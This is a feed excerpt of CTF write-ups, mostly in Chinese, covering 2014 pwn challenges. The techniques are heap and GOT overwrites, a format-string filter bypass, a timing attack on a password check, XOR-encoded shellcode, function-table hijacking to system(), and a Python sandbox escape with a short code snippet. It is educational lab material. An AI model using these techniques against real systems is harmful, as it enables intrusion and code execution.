+原本以為是 overwrite 失敗&lt;br&gt;
+但是仔細一看問題是出在下一次 call free 才 crash&lt;br&gt;
+我卡在這時 jeffxx 就解完了 XD&lt;br&gt;
+原本是打算去改 &lt;code&gt;free()&lt;/code&gt; 的 GOT&lt;br&gt;
+才發現 &lt;code&gt;free()&lt;/code&gt; 寫死了沒辦法改&lt;br&gt;
+不過還有個 &lt;code&gt;printf()&lt;/code&gt; 可以改&lt;br&gt;
+&lt;code&gt;printf()&lt;/code&gt; 的位置在 0x0804c004&lt;br&gt;
+要跳轉出來的位置就是他 print 出的第 10 個位置 XDDD&lt;br&gt;
+最後的 payload 是：&lt;br&gt;
+&lt;code&gt;[jmp addr][0x0804c000][nop][addr]&lt;/code&gt;  &lt;/p&gt;
+&lt;p&gt;剩下就是寫 shellcode 了&lt;br&gt;
+因為會 write 兩次&lt;br&gt;
+我是第二次才 overwrite GOT&lt;br&gt;
+由於第一次會把 jmp addr +8 的地方改成 &lt;code&gt;0x0804c000&lt;/code&gt;&lt;br&gt;
+要記得被改爛的這 4 byte 給跳開&lt;br&gt;
+這樣就成功拿到 shell 了  &lt;/p&gt;</content><category term="DEF CON CTF"></category><category term="Heap Overflow"></category></entry><entry><title>Dragon Sector CTF 2014 Pwnable200</title><link href="https://ddaa.tw/dsctf_pwn_200_calc_machine.html" rel="alternate"></link><published>2014-04-29T03:15:00+08:00</published><updated>2014-04-29T03:15:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-04-29:/dsctf_pwn_200_calc_machine.html</id><summary type="html">&lt;p&gt;I almost forget how to use format string vulnerability attack......  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;After connecting the server, we can get the message like that:  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Welcome to Multipurpose Calculation Machine!&lt;br&gt;
+Menu:&lt;br&gt;
+  add:  Addition&lt;br&gt;
+  sub:  Subtraction&lt;br&gt;
+  mul:  Multiplication&lt;br&gt;
+  div:  Division&lt;br&gt;
+  pow:  Power&lt;br&gt;
+  mod:  Modulo&lt;br&gt;
+  sin:  Sinus&lt;br&gt;
+  cos:  Cosinus&lt;br&gt;
+  tan:  Tangens&lt;br&gt;
+  cot:  Cotangens&lt;br&gt;
+  quit&lt;br&gt;
+Choice: add …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;p&gt;I almost forget how to use format string vulnerability attack......  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;After connecting the server, we can get the message like that:  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Welcome to Multipurpose Calculation Machine!&lt;br&gt;
+Menu:&lt;br&gt;
+  add:  Addition&lt;br&gt;
+  sub:  Subtraction&lt;br&gt;
+  mul:  Multiplication&lt;br&gt;
+  div:  Division&lt;br&gt;
+  pow:  Power&lt;br&gt;
+  mod:  Modulo&lt;br&gt;
+  sin:  Sinus&lt;br&gt;
+  cos:  Cosinus&lt;br&gt;
+  tan:  Tangens&lt;br&gt;
+  cot:  Cotangens&lt;br&gt;
+  quit&lt;br&gt;
+Choice: add&lt;br&gt;
+[add] Choose the number of parameters: 1&lt;br&gt;
+[add] Provide parameter 1: 1&lt;br&gt;
+[add] Message of the day: Don't cry because it's over, smile because it happened. -- Dr. Seuss, operands: [1]&lt;br&gt;
+[add] The sum of provided numbers is 1  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Expect the choice, the problem uses &lt;code&gt;scanf("%u")&lt;/code&gt; to get users input.  So there hasn't bof to overwrite memorys. In each choice, the programe uses &lt;code&gt;printf(format)&lt;/code&gt; to print "Message of day" and "operands". The length of &lt;code&gt;format&lt;/code&gt; is 308 bytes. And the problem runs a for loop which counts to 308 and checks whether &lt;code&gt;foramt&lt;/code&gt; has &lt;code&gt;%&lt;/code&gt; symbol.  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;strncpy(format,unk_3bc0,n);
+for(j=0;j&amp;lt;n;j++){ //n=308
+    if(format[j]==&amp;#39;%&amp;#39;)
+    format[j]=&amp;#39;_&amp;#39;;
+}
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;It seems to prevent the format string attack. However, if the length of "Message of day" + "operand" + others is bigger than 308, it will cause the end of string &lt;code&gt;\0&lt;/code&gt; be overwrite. Luckily, the input of choice is behind of &lt;code&gt;format&lt;/code&gt;. Thus, we can bypass the filter of &lt;code&gt;%&lt;/code&gt; symbol and use the format string vulnerability.  &lt;/p&gt;
+&lt;p&gt;Then we use &lt;code&gt;%x&lt;/code&gt; to leak the memory, and notice the program uses ASLR protection. We must calculate the base by subtracting &lt;code&gt;0x3b00&lt;/code&gt;. Then using &lt;code&gt;%n&lt;/code&gt; to overwrite memory. I try to overwrite return address at first, but it's not work. I use GDB to trace the program , it execute &lt;code&gt;system('/bin/sh')&lt;/code&gt; indeed. However it doesn't open shell. So I decide to try another way.  &lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;main&lt;/code&gt; function will dynamic execute the function that maps to each choice. The function table is started at 0x3b00. I decide to overwrite &lt;code&gt;quit&lt;/code&gt; choice, it is at 0x3b80 and its value is 0x1fea. After overwriting it to 0x0d20,we can type &lt;code&gt;quit&lt;/code&gt; and get the shell.  &lt;/p&gt;
+&lt;p&gt;flag: &lt;code&gt;DSCTF_d7b9926c37e5e6b1f796abaf8a3ae7a26050ddb78c4685985321f03d6fd273ba&lt;/code&gt;&lt;/p&gt;</content><category term="Other CTF"></category><category term="Format String"></category></entry><entry><title>VolgaCTF 2014 Exploit 100 Exploit100</title><link href="https://ddaa.tw/volgactf_exploit_100_exploit100.html" rel="alternate"></link><published>2014-03-31T00:48:00+08:00</published><updated>2014-03-31T00:48:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-03-31:/volgactf_exploit_100_exploit100.html</id><summary type="html">&lt;p&gt;突然被揪來玩的一次ctf XDD&lt;br&gt;
+結果說好的養身又沒了 OTZ&lt;br&gt;
+這次想嘗試解比較難的題目&lt;br&gt;
+結果就是 very not work ....&lt;br&gt;
+希望下次能解些分數比較高的題目 QQ  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;一樣先看題目環境:   &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The password consists of 12 printable characters&lt;br&gt;
+111111111111&lt;br&gt;
+344  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;while(1){
+  ...
+  if ( v5 == 12 )
+      break;
+    v7 = rand() % 1000;
+    for ( j = 0; j &amp;lt; v5; ++j )
+    {
+      for ( k = 1; (unsigned int)k &amp;lt;= 0xDEADBEEE; ++k )
+        v7 = k ^ (k + v7);
+    }
+    sprintf(&amp;amp;s …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;突然被揪來玩的一次ctf XDD&lt;br&gt;
+結果說好的養身又沒了 OTZ&lt;br&gt;
+這次想嘗試解比較難的題目&lt;br&gt;
+結果就是 very not work ....&lt;br&gt;
+希望下次能解些分數比較高的題目 QQ  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;一樣先看題目環境:   &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The password consists of 12 printable characters&lt;br&gt;
+111111111111&lt;br&gt;
+344  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;while(1){
+  ...
+  if ( v5 == 12 )
+      break;
+    v7 = rand() % 1000;
+    for ( j = 0; j &amp;lt; v5; ++j )
+    {
+      for ( k = 1; (unsigned int)k &amp;lt;= 0xDEADBEEE; ++k )
+        v7 = k ^ (k + v7);
+    }
+    sprintf(&amp;amp;s, &amp;quot;%x\n&amp;quot;, v7);
+    write(fd, &amp;amp;s, strlen(&amp;amp;s));
+  }
+  write(fd, v10, strlen(v10));
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;這題會接受 12 個字元&lt;br&gt;
+然後跟 &lt;em&gt;password.txt&lt;/em&gt; 比對&lt;br&gt;
+如果相同就會把 flag 印出來&lt;br&gt;
+如果不同則會檢查有幾個字元是相同&lt;br&gt;
+把結果存在變數 &lt;code&gt;v5&lt;/code&gt;&lt;br&gt;
+接著對密碼做 v5 次的 xor 運算 然後把結果回傳&lt;br&gt;
+比如說 答對兩個字元就會做兩次計算&lt;br&gt;
+全部答錯則一次都不計算  &lt;/p&gt;
+&lt;p&gt;想了一陣子突然發現這題根本不用知道運算的結果&lt;br&gt;
+因為只要不是全部答錯就會花上好一段時間去算&lt;br&gt;
+可以用是不是馬上回傳結果來判斷 &lt;code&gt;input == password&lt;/code&gt;&lt;br&gt;
+用的技巧跟 &lt;strong&gt;SQli&lt;/strong&gt; 猜密碼差不多&lt;br&gt;
+先找出一個不包含在 password 的字元&lt;br&gt;
+接著逐步嘗試每個位置&lt;br&gt;
+ex : &lt;code&gt;a11111111111&lt;/code&gt;&lt;br&gt;
+如果 a 包含在 password 就會花一段時間去計算&lt;br&gt;
+反之則馬上有結果&lt;br&gt;
+最後試出來的結果是 &lt;code&gt;S@nd_will2z0&lt;/code&gt;&lt;br&gt;
+p.s 這題最難的地方是題目環境一直掛掉  &lt;/p&gt;
+&lt;p&gt;flag : &lt;code&gt;Time_works_for_you&lt;/code&gt;  &lt;/p&gt;</content><category term="Other CTF"></category></entry><entry><title>BCTF 2014 PWN 100 後門程序</title><link href="https://ddaa.tw/bctf_pwn_100_backdoor.html" rel="alternate"></link><published>2014-03-12T18:12:00+08:00</published><updated>2014-03-12T18:12:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-03-12:/bctf_pwn_100_backdoor.html</id><summary type="html">&lt;p&gt;這題算是很基本的 pwn&lt;br&gt;
+但是可能因為中間有點小陷阱&lt;br&gt;
+所以解出來的人不多 (?  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;連到目標環境後會印出一堆歌詞 (?&lt;br&gt;
+輸入 n 就離開程式，不然會在印一次歌詞  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;...&lt;br&gt;
+Drink all the booze&lt;br&gt;
+Hack all the things  &lt;/p&gt;
+&lt;p&gt;Replay?(y/n)  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;檢查程式以後&lt;br&gt;
+程式有故意留下的 backdoor&lt;br&gt;
+只要 input 符合條件&lt;br&gt;
+就會跳轉到 buf 執行 shellcode&lt;br&gt;
+行為如下：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;判斷 input 第一個字是否為 'n' or 'N'，是則終止程式  &lt;/li&gt;
+&lt;li&gt;將 input 與 &lt;code&gt;&amp;lt;baidu-rocks,froM-china-with-love&amp;gt;&lt;/code&gt; 做 xor 加密  &lt;/li&gt;
+&lt;li&gt;如果 xor 後前面 10 …&lt;/li&gt;&lt;/ol&gt;</summary><content type="html">&lt;p&gt;這題算是很基本的 pwn&lt;br&gt;
+但是可能因為中間有點小陷阱&lt;br&gt;
+所以解出來的人不多 (?  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;連到目標環境後會印出一堆歌詞 (?&lt;br&gt;
+輸入 n 就離開程式，不然會在印一次歌詞  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;...&lt;br&gt;
+Drink all the booze&lt;br&gt;
+Hack all the things  &lt;/p&gt;
+&lt;p&gt;Replay?(y/n)  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;檢查程式以後&lt;br&gt;
+程式有故意留下的 backdoor&lt;br&gt;
+只要 input 符合條件&lt;br&gt;
+就會跳轉到 buf 執行 shellcode&lt;br&gt;
+行為如下：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;判斷 input 第一個字是否為 'n' or 'N'，是則終止程式  &lt;/li&gt;
+&lt;li&gt;將 input 與 &lt;code&gt;&amp;lt;baidu-rocks,froM-china-with-love&amp;gt;&lt;/code&gt; 做 xor 加密  &lt;/li&gt;
+&lt;li&gt;如果 xor 後前面 10 byte == 'n0b4CKd00r' 就轉到 buf + 1  &lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;所以我們要計算 &lt;code&gt;n0b4CKd00r&lt;/code&gt; + &lt;code&gt;shellcode&lt;/code&gt; xor 後的值
+但是陷阱在於 scanf 讀到某些字元就會終止 &lt;code&gt;ex: \x00&lt;/code&gt;&lt;br&gt;
+導致 shellcode 沒有完全被載入&lt;br&gt;
+還好這題沒有對 shell code 長度做限制&lt;br&gt;
+可以靠塞 nop 調整 shellcode 的 offset 來避開特殊字元&lt;br&gt;
+接著就發現 &lt;code&gt;/home/ctf/flag.txt&lt;/code&gt; 底下有答案了  &lt;/p&gt;
+&lt;p&gt;flag: &lt;code&gt;BCTF{H4v3-4-n1C3-pWn1ng-f3sT1v4l!!}&lt;/code&gt;  &lt;/p&gt;</content><category term="XCTF"></category></entry><entry><title>Boston Key Party CTF 2014 Pwn 100 risc_emu</title><link href="https://ddaa.tw/bkpctf_pwn_100_risc_emu.html" rel="alternate"></link><published>2014-03-02T23:50:00+08:00</published><updated>2014-03-02T23:50:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-03-02:/bkpctf_pwn_100_risc_emu.html</id><summary type="html">&lt;p&gt;這次為期36小時&lt;br&gt;
+題目很多 而且有些感覺很有趣&lt;br&gt;
+可惜周六有點事情 這次沒辦法全程參與&lt;br&gt;
+最後只拿到500分 好弱 ORZ  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;這題是模擬 RISC CPU 的程式&lt;br&gt;
+類型是 Pwning , ELF x64&lt;br&gt;
+能執行類似 ARM 語法的模擬器  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;RISC CPU Emulator BkP 2014&lt;br&gt;
+Give me your bytecode!&lt;br&gt;
+Please give me your bytecode base64'd:&lt;br&gt;
+aaaa&lt;br&gt;
+Got it, executing aaaa now!&lt;br&gt;
+I don't recognize opcode 0x69  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;我們可以給它一個 bytecode (須加密成 base64)&lt;br&gt;
+格式為 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;這次為期36小時&lt;br&gt;
+題目很多 而且有些感覺很有趣&lt;br&gt;
+可惜周六有點事情 這次沒辦法全程參與&lt;br&gt;
+最後只拿到500分 好弱 ORZ  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;這題是模擬 RISC CPU 的程式&lt;br&gt;
+類型是 Pwning , ELF x64&lt;br&gt;
+能執行類似 ARM 語法的模擬器  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;RISC CPU Emulator BkP 2014&lt;br&gt;
+Give me your bytecode!&lt;br&gt;
+Please give me your bytecode base64'd:&lt;br&gt;
+aaaa&lt;br&gt;
+Got it, executing aaaa now!&lt;br&gt;
+I don't recognize opcode 0x69  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;我們可以給它一個 bytecode (須加密成 base64)&lt;br&gt;
+格式為 [opcode] [dst] [src] [value] (會依據指令不同有所分別)&lt;br&gt;
+dst 就是模擬的 register&lt;br&gt;
+位於程式 heap 的某些區段&lt;br&gt;
+能接受的指令有 9 種：&lt;br&gt;
+&lt;code&gt;add&lt;/code&gt;,&lt;code&gt;addi&lt;/code&gt;,&lt;code&gt;sub&lt;/code&gt;,&lt;code&gt;subi&lt;/code&gt;,&lt;code&gt;xor&lt;/code&gt;,&lt;code&gt;and&lt;/code&gt;,&lt;code&gt;mul&lt;/code&gt;,&lt;code&gt;div&lt;/code&gt;,&lt;code&gt;term&lt;/code&gt;  &lt;/p&gt;
+&lt;p&gt;reverse 以後發現處理指令的方式位於 &lt;code&gt;0x401c66&lt;/code&gt;&lt;br&gt;
+是以一個 function table 儲存每個指令的 address&lt;br&gt;
+再由 &lt;code&gt;call eax&lt;/code&gt; 的方式去執行&lt;br&gt;
+接著繼續 trace 發現一個有趣的事情&lt;br&gt;
+大部分的指令在 dst 都有做過濾&lt;br&gt;
+如果 &lt;strong&gt;&amp;gt;=8&lt;/strong&gt; 就會回傳 &lt;code&gt;ERROR!&lt;/code&gt;&lt;br&gt;
+只有 &lt;code&gt;addi&lt;/code&gt; 和 &lt;code&gt;subi&lt;/code&gt; 不會!&lt;br&gt;
+這邊可以任意竄改 &lt;code&gt;0x604b50+0xff&lt;/code&gt; 範圍之內的的值&lt;br&gt;
+&lt;code&gt;0x604b50&lt;/code&gt;~&lt;code&gt;0x604b70&lt;/code&gt; 是模擬器中 register 的值&lt;br&gt;
+而 0x604c10 開始就是 function table&lt;br&gt;
+我們可以竄改 function table 到我們要的 eip  &lt;/p&gt;
+&lt;p&gt;到這邊為止都是正確的思路&lt;br&gt;
+接下來我浪費了將近5小時在做 exploit...&lt;br&gt;
+我發現不管輸入多長的字串&lt;br&gt;
+emu 會切割成好幾個 4 byte 的指令並執行&lt;br&gt;
+後面可以塞shellcode&lt;br&gt;
+接著我企圖透過 &lt;code&gt;addi&lt;/code&gt; 將其中一個 function 的值&lt;br&gt;
+由 &lt;code&gt;0x40xxxx&lt;/code&gt; 覆寫成 &lt;code&gt;0x60xxxx&lt;/code&gt; 也就是 buf 的位置&lt;br&gt;
+但是由於 emu 每次執行完指令後回將 return value 存在 heap 中&lt;br&gt;
+執行超過12個指令將會蓋到題目的 heap guard&lt;br&gt;
+將會出現：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;*** HEAP FUCKERY DETECTED ***: /home/dada/wargame/risc_emu/emu terminated *&lt;br&gt;
+Obtained 4 stack frames.&lt;br&gt;
+/home/dada/wargame/risc_emu/emu() [0x4025f6]&lt;br&gt;
+/home/dada/wargame/risc_emu/emu() [0x401bb2]&lt;br&gt;
+/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xed) [0x7ffff722976d]&lt;br&gt;
+/home/dada/wargame/risc_emu/emu() [0x401379]  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;但是如果我們輸入不只 4 byte&lt;br&gt;
+後面的指令會繼續被執行&lt;br&gt;
+並不會馬上將 return value 存到 heap&lt;br&gt;
+於是還是可以將 function table 寫成 buf 的位置&lt;br&gt;
+一切都就緒後我發現還是無法成功&lt;br&gt;
+why? 因為這題有 DEP 囧!!!!!!!&lt;br&gt;
+所以這一段基本上都是白費工夫&lt;br&gt;
+因為所有能塞 shellcode 的區段根本沒辦法執行 Orz  &lt;/p&gt;
+&lt;p&gt;到這邊我就很賭爛的去睡覺了&lt;br&gt;
+隔天起來突然發現這題原來got裡有一個 &lt;code&gt;system()&lt;/code&gt; ...&lt;br&gt;
+而且很剛好 在 &lt;code&gt;call eax&lt;/code&gt; 到 emu function 的時候&lt;br&gt;
+剛好 rdi 指向的是 buf 的位置.....OTZ (x64 參數指標是放在 rdi)&lt;br&gt;
+所以這題只要：  &lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;用 addi 去改 function table 中一個 function 的值 ex: &lt;code&gt;term&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;第一個 byte 放 \x09 (&lt;code&gt;term&lt;/code&gt; 的 opcode) 後面接 system 的參數&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;就可以任意執行指令了 ORZ&lt;br&gt;
+此外這題已經把 stdout dup 到socket&lt;br&gt;
+所以只要 &lt;code&gt;system("cat key")&lt;/code&gt; 以後就有 key 了  &lt;/p&gt;
+&lt;p&gt;flag: &lt;code&gt;stupid_boston_leprechauns_and_geohots&lt;/code&gt;  &lt;/p&gt;</content><category term="BKPCTF"></category><category term="Out-of-bound"></category></entry><entry><title>phd CTF 2014 Pwn 3900 pyjail</title><link href="https://ddaa.tw/phd_pwn_3900_pyjail.html" rel="alternate"></link><published>2014-01-28T21:31:00+08:00</published><updated>2014-01-28T21:31:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-01-28:/phd_pwn_3900_pyjail.html</id><summary type="html">&lt;p&gt;這題解超久 = = 好險有解出來&lt;br&gt;
+但是知道關鍵又覺得這題好像沒什麼 Orz&lt;br&gt;
+就好像變魔術一樣&lt;br&gt;
+謎底揭曉就不好玩了 QQ  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;這題給了 py 的 source code&lt;br&gt;
+我們可以輸入一些指令&lt;br&gt;
+pyjail 會利用 &lt;code&gt;exec&lt;/code&gt; 去執行&lt;br&gt;
+但是有做一些限制:  &lt;/p&gt;
+&lt;p&gt;1) 以下關鍵字都被過濾了...  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sanitize = re.compile(  
+  r&amp;#39;(?:__|import|globals|locals|exec|eval|join|format|replace|translate|try|except|with|content|frame|back)&amp;#39;  
+  ).sub  
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;2) 僅接受以下字元  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;alphabet = &amp;#39; \n\r0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ(),.:;&amp;lt;=&amp;gt;[]_{}&amp;#39;  
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;3) 只留下 trusted …&lt;/p&gt;</summary><content type="html">&lt;p&gt;這題解超久 = = 好險有解出來&lt;br&gt;
+但是知道關鍵又覺得這題好像沒什麼 Orz&lt;br&gt;
+就好像變魔術一樣&lt;br&gt;
+謎底揭曉就不好玩了 QQ  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;這題給了 py 的 source code&lt;br&gt;
+我們可以輸入一些指令&lt;br&gt;
+pyjail 會利用 &lt;code&gt;exec&lt;/code&gt; 去執行&lt;br&gt;
+但是有做一些限制:  &lt;/p&gt;
+&lt;p&gt;1) 以下關鍵字都被過濾了...  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sanitize = re.compile(  
+  r&amp;#39;(?:__|import|globals|locals|exec|eval|join|format|replace|translate|try|except|with|content|frame|back)&amp;#39;  
+  ).sub  
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;2) 僅接受以下字元  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;alphabet = &amp;#39; \n\r0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ(),.:;&amp;lt;=&amp;gt;[]_{}&amp;#39;  
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;3) 只留下 trusted built-in function  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;trusted_builtins = &amp;quot;&amp;quot;&amp;quot;  
+  True False type int  
+  &amp;quot;&amp;quot;&amp;quot;.split()  
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;這題的目的很明確，直接看 code :   &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def exec_in_context(ctx):  
+  exec code in ctx  
+  print &amp;#39;Flag is&amp;#39;,  
+  try:  
+    assert FLAG != part1_of_flag  
+  except:  
+    print &amp;#39;********************&amp;#39;  
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;code&gt;exec code in ctx&lt;/code&gt; 執行我們輸入的程式碼&lt;br&gt;
+接著只要 &lt;code&gt;FLAG != part1_of_flag&lt;/code&gt; == True&lt;br&gt;
+就會把 FLAG 印出來&lt;br&gt;
+不然就會印出一堆星星&lt;br&gt;
+至於 FLAG 的值&lt;br&gt;
+是由以下兩個 function 去決定:  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def we_must_be_sure_flag_part1_is_ready():  
+    global FLAG  
+    FLAG = part1_of_flag  
+
+def we_must_be_sure_flag_part2_is_ready():  
+    global FLAG  
+    FLAG += part2_of_flag  
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;由於 &lt;code&gt;exec code in ctx&lt;/code&gt;&lt;br&gt;
+closure 被限制了&lt;br&gt;
+我們只能執行 &lt;code&gt;ctx = {'div': divider}&lt;/code&gt; 中所定義的的 function :  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def divider(v1):  
+    a = &amp;quot;You are lucky!&amp;quot;  
+    b = &amp;quot;Try again!&amp;quot;  
+
+    def divider(v2):  
+        i,t,s,  n,o,t,  s,o,  h,a,r,d  
+        if int(v1) / int(v2) == EXPECTED:  
+            print a  
+            we_must_be_sure_flag_part2_is_ready()  
+        else:  
+            print b  
+    we_must_be_sure_flag_part1_is_ready()  
+    return divider  
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;part1 的部分很簡單&lt;br&gt;
+我們直接呼叫 div(1) 就會執行到了&lt;br&gt;
+但是 part2 的部分&lt;br&gt;
+&lt;code&gt;EXPECTED = 13.37&lt;/code&gt;&lt;br&gt;
+兩個int相除不可能會是float Orz&lt;br&gt;
+因此需要想辦法繞過那條限制  &lt;/p&gt;
+&lt;p&gt;最直覺想法是改 &lt;code&gt;EXPECT&lt;/code&gt; 的值&lt;br&gt;
+但是測試後發現 &lt;code&gt;EXPECT&lt;/code&gt; 不是 free variable&lt;br&gt;
+怎麼改都沒效 XD&lt;br&gt;
+後來想透過 overload &lt;code&gt;int()&lt;/code&gt;&lt;br&gt;
+傳入自訂的 class&lt;br&gt;
+令即使是用 &lt;code&gt;int()&lt;/code&gt; 結果依然是 &lt;em&gt;float&lt;/em&gt;&lt;br&gt;
+可惜也失敗了&lt;br&gt;
+因為 &lt;em&gt;__&lt;/em&gt; 被過濾 而且 &lt;em&gt;&lt;strong&gt;name&lt;/strong&gt;&lt;/em&gt; 也被拿掉了 = =  &lt;/p&gt;
+&lt;p&gt;後來仔細想&lt;br&gt;
+會留下 &lt;code&gt;type()&lt;/code&gt; 一定有他的原因&lt;br&gt;
+以此作為突破點&lt;br&gt;
+發現可以用 function 中有一個 attribute &lt;code&gt;func_code&lt;/code&gt;&lt;br&gt;
+這個參數是 python 的 byte code&lt;br&gt;
+可以替換這個屬性來執行其他的 function&lt;br&gt;
+但是我在替換時&lt;br&gt;
+遇上了 free variable 數目不符的訊息&lt;br&gt;
+對 python 不夠熟 ... 不知道怎麼解決 QQ&lt;br&gt;
+只好另尋他法&lt;br&gt;
+就發現還有一個屬性 &lt;code&gt;func_closure&lt;/code&gt;&lt;br&gt;
+裡面定義了函式中&lt;br&gt;
+屬於其 closure 的變數或函式&lt;br&gt;
+&lt;code&gt;print div(1).func_closure&lt;/code&gt;&lt;br&gt;
+列出了一堆local variavle&lt;br&gt;
+最後一項為:  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;cell at 0x801858520: function object at 0x80185cd70&gt;  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;這個物件其實就是 &lt;code&gt;we_must_be_sure_flag_part2_is_ready()&lt;/code&gt;&lt;br&gt;
+理論上可以用 &lt;code&gt;cell_contents&lt;/code&gt; 將 cell 中的 object 拿出來&lt;br&gt;
+但是 &lt;strong&gt;content&lt;/strong&gt; 被過濾 ...&lt;br&gt;
+這時可以利用 type 新增物件的方式&lt;br&gt;
+來得到 cell 的值  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def get_cell_value(cell):  
+    return type(lambda: 0)(  
+        (lambda x: lambda: x)(0).func_code, {}, None, None, (cell,)  
+    )()  
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;原理是:  &lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;type(function)(func_code, func_global, func_name, func_default, func_closure)&lt;/code&gt;&lt;br&gt;
+用這樣的方式定出一個 &lt;em&gt;print cell&lt;/em&gt; 的 function  &lt;/li&gt;
+&lt;li&gt;&lt;code&gt;(lambda x: lambda: x)(0)&lt;/code&gt;&lt;br&gt;
+定義這個 function 會把第一個參數的值回傳  &lt;/li&gt;
+&lt;li&gt;最後把 cell 包裝成 closure 的形式&lt;br&gt;
+原本的 closure 被換成我們傳入的 cell&lt;br&gt;
+所以參數就變成 cell 中的 value  &lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;如此一來就可以執行 &lt;code&gt;we_must_be_sure_flag_part2_is_ready()&lt;/code&gt; 了&lt;br&gt;
+btw, 前面想的利用替換 &lt;em&gt;func_code&lt;/em&gt; 也是可行的&lt;br&gt;
+這題還有彩蛋，是要想辦法 read 檔案&lt;br&gt;
+我沒有解出來 QQ&lt;br&gt;
+後來才知道利用替換 func_code 的方式&lt;br&gt;
+只要新增一行 &lt;code&gt;print type(stdout)(egg).read()&lt;/code&gt;&lt;br&gt;
+就可以讀檔案了  &lt;/p&gt;
